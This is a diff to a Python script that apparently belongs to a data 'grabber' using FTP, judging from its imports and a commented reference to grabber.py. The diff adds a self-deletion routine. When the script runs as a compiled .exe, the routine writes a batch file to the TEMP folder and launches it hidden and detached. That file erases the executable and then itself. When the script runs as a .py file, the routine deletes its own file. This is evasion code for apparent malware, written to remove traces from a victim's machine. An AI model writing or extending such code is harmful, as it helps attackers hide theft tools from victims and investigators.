@@ -1,4 +1,5 @@
 import os
+import subprocess
 import re
 import sys
 from ftplib import FTP
@@ -80,5 +81,30 @@ try:
     #   os.remove(grabber.py)    
 except:
     pass
+
+# Self supression
+def self_delete():
+    try:
+        if getattr(sys, 'frozen', False):
+            # Si c'est un .exe compilé
+            exe_path = sys.executable
+            batch = f'''@echo off
+timeout /t 1 /nobreak >nul
+del /f /q "{exe_path}"
+del /f /q "%~f0"
+'''
+            batch_path = os.path.join(os.environ['TEMP'], 'del.bat')
+            with open(batch_path, 'w') as f:
+                f.write(batch)
+            subprocess.Popen(batch_path, shell=True, 
+                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
+        else:
+            # if it is a .py
+            os.remove(__file__)
+    except:
+        pass
+
+self_delete()
+
 
 
